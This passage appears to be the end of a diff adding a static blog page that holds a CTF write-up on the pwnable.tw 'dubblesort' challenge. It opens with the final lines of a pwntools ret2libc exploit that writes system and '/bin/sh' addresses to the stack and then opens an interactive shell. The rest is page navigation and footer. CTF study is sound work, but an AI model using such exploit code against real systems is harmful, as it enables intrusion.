p.recv()</span><br><span class="line">p.sendline(&#39;+&#39;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(9):</span><br><span class="line">    p.sendline(str(system_addr))</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(str(bin_sh_addr))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-tw-challenge-dubblesort"><span class="toc-number">1.</span> <span class="toc-text">pwnable.tw_challenge_dubblesort</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-main"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-字符串结尾-x00截断问题"><span class="toc-number">1.2.1.</span> <span class="toc-text">0x01 字符串结尾\x00截断问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-scanf读取unsigned数时非法字符问题"><span class="toc-number">1.2.2.</span> <span class="toc-text">0x02 scanf读取unsigned数时非法字符问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x03-ret2libc"><span class="toc-number">1.2.3.</span> <span class="toc-text">0x03 ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#0x01-system的偏移量"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">0x01 system的偏移量</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#0x02-“-bin-sh”的偏移量"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">0x02  “\bin\sh”的偏移量</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#0x03-程序加载libc库的基地址"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">0x03 程序加载libc库的基地址</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#栈中数据构造"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">栈中数据构造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-EXP"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 EXP</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&text=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&title=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&is_video=false&description=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw_dublesort&body=Check out this article: http://yoursite.com/2018/06/04/pwnable-tw-dublesort/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&title=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&title=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&title=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&title=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&name=pwnable.tw_dublesort&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
